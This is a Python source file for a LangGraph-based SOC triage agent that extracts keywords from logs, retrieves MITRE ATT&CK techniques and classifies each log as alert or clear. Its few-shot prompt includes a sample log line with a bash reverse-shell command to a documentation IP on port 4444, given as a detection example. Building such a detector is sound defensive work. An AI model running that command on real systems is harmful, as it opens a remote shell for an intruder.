import logging
import re
from langgraph.graph import StateGraph, END
from langchain_core.prompts import ChatPromptTemplate
from langchain_core.messages import SystemMessage, HumanMessage
from config.llm_factory import get_llm, load_config
from models.schemas import AgentState, TriageOutput
from tools.vector_store import VectorStoreManager
from tools.utils import parse_llm_response

logger = logging.getLogger("cyber_graph")


def query_generator_node(state: AgentState) -> dict:
    """Extract semantic search terms from raw log block."""
    logger.info("--- [Step 1: Query Generator] Extracting search keywords from logs ---")
    logger.debug("Raw logs:\n%s", state.get("raw_logs", ""))

    config = load_config()
    llm = get_llm("query_generator", config)
    
    prompt = ChatPromptTemplate.from_messages([
        ("system", "You are a technical keyword extractor for SOC logs. First, in <think>...</think> tags, provide a concise 2-point analysis (entities, search_focus). Then, return only 2 to 4 technical keywords separated by commas."),
        ("human", "Logs to analyze:\nJan 15 14:22:10 web-prod sudo[28910]: www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash -c \"bash -i >& /dev/tcp/198.51.100.23/4444 0>&1\""),
        ("assistant", "<think>\n1. entities: user=www-data, binary=sudo/bash, socket=/dev/tcp/198.51.100.23/4444\n2. search_focus: sudo, bash, reverse shell, tcp\n</think>\nsudo, bash, reverse shell, tcp"),
        ("human", "Logs to analyze:\n{logs}")
    ])

    
    chain = prompt | llm
    try:
        raw_response = chain.invoke({"logs": state["raw_logs"]})
        parsed = parse_llm_response(raw_response)

        
        if parsed.get("thinking"):
            logger.debug("🧠 [Query Generator Thinking]:\n%s", parsed["thinking"])
            
        search_query = parsed.get("output", "").strip()
    except Exception as e:
        logger.warning("Query generator LLM invocation failed: %s", e)
        search_query = ""

    # Fallback if the LLM returned empty string (common with sub-1B models)
    if not search_query:
        logger.warning("Query generator produced empty query. Falling back to log snippet heuristic.")
        words = [w for w in state["raw_logs"].replace("\n", " ").split() if len(w) > 3 and not w.isdigit()]
        search_query = " ".join(words[:6])

    logger.info("Generated Search Query: '%s'", search_query)
    return {"search_query": search_query, "retry_count": 0}


def retriever_node(state: AgentState) -> dict:
    """Retrieve top-k relevant MITRE techniques using VectorStoreManager."""
    query = state["search_query"]
    logger.info("--- [Step 2: Retriever] Searching MITRE knowledge base for '%s' ---", query)

    vsm = VectorStoreManager()
    docs = vsm.hybrid_search(query, k=3)
    chunks = [doc.page_content for doc in docs]

    logger.info("Retrieved %d relevant MITRE techniques.", len(chunks))
    for idx, doc in enumerate(docs, 1):
        mitre_id = doc.metadata.get("mitre_id", "N/A") if doc.metadata else "N/A"
        name = doc.metadata.get("name", "Unknown") if doc.metadata else "Unknown"
        logger.debug("Chunk %d: [%s] %s", idx, mitre_id, name)

    return {"retrieved_chunks": chunks}


def synthesizer_node(state: AgentState) -> dict:
    """Evaluate logs against retrieved context and classify."""
    retry = state.get("retry_count", 0)
    logger.info("--- [Step 3: Synthesizer] Evaluating logs with MITRE context (Attempt: %d) ---", retry + 1)

    config = load_config()
    llm = get_llm("synthesizer", config)
    
    # Configure structured output with include_raw=True to capture raw message & thinking
    try:
        structured_llm = llm.with_structured_output(TriageOutput, method="json_mode", include_raw=True)
    except Exception:
        structured_llm = llm.with_structured_output(TriageOutput, include_raw=True)

    context_str = "\n\n---\n\n".join(state.get("retrieved_chunks", []))
    
    system_prompt = (
        "You are an expert autonomous SOC EDR agent. Analyze the provided logs.\n"
        "Crucial instruction: The retrieved MITRE context might contain false leads "
        "or distractor techniques. If the log shows benign system/admin activity, "
        "ignore the context and mark status as 'clear'. Verify MITRE IDs strictly.\n\n"
        "Return a JSON object conforming to this schema:\n"
        "{\n"
        '  "status": "alert" | "clear",\n'
        '  "category": "security" | "system_health" | "noise",\n'
        '  "mitre_id": "T1059.004" | null,\n'
        '  "confidence": "low" | "medium" | "high",\n'
        '  "reasoning": "Rationale string...",\n'
        '  "recommended_action": "Remediation string or null"\n'
        "}"
    )

    # If this is a retry, append the previous error
    error_context = f"\nFIX PREVIOUS ERROR: {state['error_msg']}" if state.get("error_msg") else ""
    
    messages = [
        SystemMessage(content=system_prompt + error_context),
        HumanMessage(content=f"Raw Logs:\n{state['raw_logs']}\n\nRetrieved MITRE Context:\n{context_str}")
    ]
    
    logger.debug("Prompt message count: %d. Error context: '%s'", len(messages), error_context.strip())
    
    try:
        res = structured_llm.invoke(messages)
        
        # Extract raw message and parse thinking
        raw_msg = res.get("raw") if isinstance(res, dict) else res
        parsed_data = parse_llm_response(raw_msg)
        
        if parsed_data.get("thinking"):
            logger.debug("🧠 [Synthesizer Thinking]:\n%s", parsed_data["thinking"])

        result = res.get("parsed") if isinstance(res, dict) else res
        if result is not None:
            logger.info("Synthesizer Verdict: status='%s', category='%s', mitre_id='%s', confidence='%s'",
                        result.status, result.category, result.mitre_id, result.confidence)
            logger.debug("Synthesizer Reasoning: %s", result.reasoning)
            return {"triage_result": result, "error_msg": ""}
        
        # Fallback parsing on clean output if structured parser failed on formatting
        if parsed_data.get("output"):
            clean_json = parsed_data["output"]
            clean_json = re.sub(r"^```(?:json)?\s*", "", clean_json, flags=re.MULTILINE)
            clean_json = re.sub(r"```$", "", clean_json, flags=re.MULTILINE).strip()
            result = TriageOutput.model_validate_json(clean_json)
            logger.info("Synthesizer Verdict (recovered): status='%s', category='%s'", result.status, result.category)
            return {"triage_result": result, "error_msg": ""}

        raise res.get("parsing_error") if isinstance(res, dict) and res.get("parsing_error") else Exception("Invalid JSON output")

    except Exception as e:
        next_retry = retry + 1
        logger.warning("Synthesizer failed to produce structured output: %s", e)
        #logger.debug("Exception details:", exc_info=True)
        return {"triage_result": None, "error_msg": str(e), "retry_count": next_retry}



def validate_output(state: AgentState) -> str:
    """Routes to END if successful, or retries if JSON parsing failed."""
    if state.get("triage_result") is not None:
        logger.info("Workflow validation: SUCCESS -> routing to END")
        return "end"
    if state.get("retry_count", 0) >= 2:
        logger.warning("Workflow validation: Max retries (2) reached -> terminating with error")
        return "end"
    
    logger.info("Workflow validation: Retrying synthesis (attempt %d)...", state.get("retry_count", 0) + 1)
    return "retry"


def build_cyber_graph():
    # Build LangGraph workflow
    workflow = StateGraph(AgentState)

    workflow.add_node("query_generator", query_generator_node)
    workflow.add_node("retriever", retriever_node)
    workflow.add_node("synthesizer", synthesizer_node)

    workflow.set_entry_point("query_generator")
    workflow.add_edge("query_generator", "retriever")
    workflow.add_edge("retriever", "synthesizer")
    workflow.add_conditional_edges(
        "synthesizer",
        validate_output,
        {
            "end": END,
            "retry": "synthesizer"  # Loops back to fix the JSON
        }
    )

    return workflow.compile()